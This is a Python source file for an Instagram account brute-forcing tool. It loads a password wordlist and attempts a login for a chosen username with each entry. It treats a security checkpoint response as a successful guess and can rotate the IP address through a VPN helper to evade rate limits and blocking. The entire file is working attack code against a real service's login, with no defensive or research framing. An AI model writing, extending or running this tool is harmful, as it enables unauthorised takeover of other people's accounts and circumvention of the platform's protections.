import os
import time
import random
import requests
import instaloader
from rich.console import Console
from utils.colors import Color
from utils.ui import display_ascii 
from utils.vpn import change_ip
from config import WORDLIST_DIR
from asciiart import ascii_art

console = Console()


def verify_password(username, password):
    loader = instaloader.Instaloader()
    
    try:
        loader.login(username, password)
        return True
    except Exception as e:
        error_msg = str(e)
        
        if "Checkpoint" in error_msg:
            return True
        elif "incorrect" in error_msg:
            return False
        elif "blocked" in error_msg:
            return False
        else:
            return False


def bruteforce(username, wordlist, vpn_enabled):
    try:
        wl_file = open(wordlist, 'r')
        wl_lines = [line.strip() for line in wl_file.readlines()]
    except FileNotFoundError:
        print(f"\n\nERROR 1x01:{Color.RED} wordlist not found, please insert your wordlist into the 'wordlist' folder.\n\n{Color.END}")
        exit()
    
    for password in wl_lines:
        if verify_password(username, password):
            os.system("clear")
            display_ascii()
            console.print(password, justify="center", style="#13f41e bold")
            exit()
        else:
            os.system("clear")
            display_ascii()
            console.print(password, justify="center", style="#ea0408 bold")
            
            if vpn_enabled:
                change_ip()
